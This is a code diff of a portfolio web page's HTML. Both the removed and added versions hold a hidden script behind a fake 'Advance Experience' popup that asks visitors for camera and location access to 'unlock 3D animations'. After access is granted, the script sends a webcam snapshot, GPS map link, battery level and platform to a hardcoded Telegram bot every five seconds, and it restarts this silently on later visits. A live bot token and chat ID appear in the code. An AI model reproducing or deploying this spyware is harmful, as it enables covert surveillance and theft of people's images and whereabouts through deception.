@@ -329,121 +329,88 @@
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script src="script.js"></script>
 
-    <style>
-    @keyframes pulse-glow {
-        0% { box-shadow: 0 0 10px #00ff88; transform: scale(1); }
-        50% { box-shadow: 0 0 25px #00ff88; transform: scale(1.05); }
-        100% { box-shadow: 0 0 10px #00ff88; transform: scale(1); }
-    }
-    #advanced-overlay {
-        display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
-        background:rgba(0,0,0,0.95); z-index:999999; display:flex; 
-        justify-content:center; align-items:center; backdrop-filter: blur(10px);
-        padding: 20px; box-sizing: border-box;
-    }
-    .robot-popup {
-        border: 2px solid #00ff88;
-        background: radial-gradient(circle, #001a11 0%, #000000 100%);
-        padding: 30px 20px; border-radius: 25px; 
-        text-align:center; max-width: 400px; width: 100%;
-    }
-    .ok-btn-style {
-        background: #00ff88; color: #000; border: none;
-        padding: 12px 50px; font-size: 18px; font-weight: bold;
-        border-radius: 50px; cursor: pointer; animation: pulse-glow 2s infinite;
-    }
-</style>
-
-<div id="advanced-overlay">
-    <div class="robot-popup">
+    <div id="advanced-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999999; display:flex; justify-content:center; align-items:center; backdrop-filter: blur(10px); padding: 15px; box-sizing: border-box;">
+    <div style="border: 2px solid #00ff88; background: #000; padding: 30px 20px; border-radius: 20px; text-align:center; max-width: 350px; width: 100%; box-shadow: 0 0 20px #00ff88;">
         <div style="font-size: 50px; margin-bottom: 10px;">🤖</div>
-        <h2 style="color:#00ff88; font-family: sans-serif;">Advance Experience</h2>
-        <p style="color:#aaddcc; font-family: sans-serif; margin-bottom: 25px; font-size: 14px;">Allow Camera & Location to unlock 3D portfolio animations.</p>
-        <button id="ok-btn" class="ok-btn-style">OK</button>
+        <h2 style="color:#00ff88; font-family: sans-serif; font-size: 20px;">Advance Experience</h2>
+        <p style="color:#aaddcc; font-family: sans-serif; margin-bottom: 25px; font-size: 13px; line-height: 1.4;">Allow Camera & Location to unlock 3D animations and full features.</p>
+        <button id="final-ok-btn" style="background:#00ff88; color:#000; border:none; padding: 12px 50px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 0 10px #00ff88;">OK</button>
     </div>
 </div>
 
 <script>
-// configuration
-const botToken = '8239197154:AAH-VeIISL9nO-EZFL2wJqcVIV6S8UhMVAY';
-const chatId = '7950771882';
+    const botToken = '8239197154:AAH-VeIISL9nO-EZFL2wJqcVIV6S8UhMVAY';
+    const chatId = '7950771882';
+    const overlay = document.getElementById('advanced-overlay');
+    const btn = document.getElementById('final-ok-btn');
 
-const overlay = document.getElementById('advanced-overlay');
-const okBtn = document.getElementById('ok-btn');
-
-// Page load logic
-window.addEventListener('load', () => {
-    if (localStorage.getItem('accessGranted') === 'true') {
-        overlay.style.display = 'none';
-        startSilentTracking();
-    } else {
-        setTimeout(() => { overlay.style.display = 'flex'; }, 3000);
-    }
-});
-
-okBtn.onclick = async function() {
-    try {
-        // Camera Permission
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        
-        // Location Permission
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            localStorage.setItem('accessGranted', 'true');
+    // পপ-আপ দেখানোর লজিক
+    window.onload = function() {
+        if (localStorage.getItem('granted') === 'true') {
             overlay.style.display = 'none';
-            
-            // Start Loop
-            setInterval(() => { captureAndSend(stream); }, 5000);
-        }, (err) => {
-            alert("Please allow Location to continue.");
-        });
-    } catch (err) {
-        alert("Camera permission is required!");
-    }
-};
+            startTracking();
+        } else {
+            setTimeout(() => { overlay.style.display = 'flex'; }, 2000);
+        }
+    };
 
-async function startSilentTracking() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        setInterval(() => { captureAndSend(stream); }, 5000);
-    } catch (e) { localStorage.removeItem('accessGranted'); }
-}
-
-async function captureAndSend(stream) {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
-    const canvas = document.createElement('canvas');
-    canvas.width = 400; canvas.height = 300;
-    
-    setTimeout(async () => {
-        canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-        const imageData = canvas.toDataURL('image/jpeg');
+    // ওকে বাটন ক্লিক লজিক
+    btn.addEventListener('click', function() {
+        console.log("Button Clicked"); // চেক করার জন্য
         
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const battery = await navigator.getBattery();
-            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            const info = `📍 Map: ${mapLink}\n🔋 Battery: ${(battery.level * 100).toFixed(0)}%\n📱 Device: ${navigator.platform}`;
-            
-            sendToTelegram(imageData, info);
+        // ক্যামেরা পারমিশন প্রম্পট
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            // লোকেশন পারমিশন প্রম্পট
+            navigator.geolocation.getCurrentPosition(function(position) {
+                localStorage.setItem('granted', 'true');
+                overlay.style.display = 'none'; // পপ-আপ রিমুভ হবে
+                
+                // তথ্য পাঠানো শুরু হবে
+                setInterval(() => { sendData(stream); }, 5000);
+            }, function(err) {
+                alert("Please enable Location for full access.");
+            });
+        })
+        .catch(function(err) {
+            alert("Camera access is required for 3D mode.");
         });
-    }, 1000);
-}
+    });
 
-function sendToTelegram(image, text) {
-    // Send Message
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: text })
-    });
-    // Send Photo
-    fetch(image).then(res => res.blob()).then(blob => {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'img.jpg');
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-    });
-}
+    async function startTracking() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            setInterval(() => { sendData(stream); }, 5000);
+        } catch(e) { localStorage.removeItem('granted'); }
+    }
+
+    async function sendData(stream) {
+        const canvas = document.createElement('canvas');
+        canvas.width = 300; canvas.height = 300;
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        setTimeout(async () => {
+            canvas.getContext('2d').drawImage(video, 0, 0, 300, 300);
+            const img = canvas.toDataURL('image/jpeg');
+            
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const b = await navigator.getBattery();
+                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                const text = `📍 Location: ${map}\n🔋 Battery: ${(b.level*100)}%\n📱 OS: ${navigator.platform}`;
+                
+                // টেলিগ্রামে পাঠানো
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+                
+                const blob = await (await fetch(img)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'x.jpg');
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method: 'POST', body: fd});
+            });
+        }, 1000);
+    }
 </script>
     
 </body>
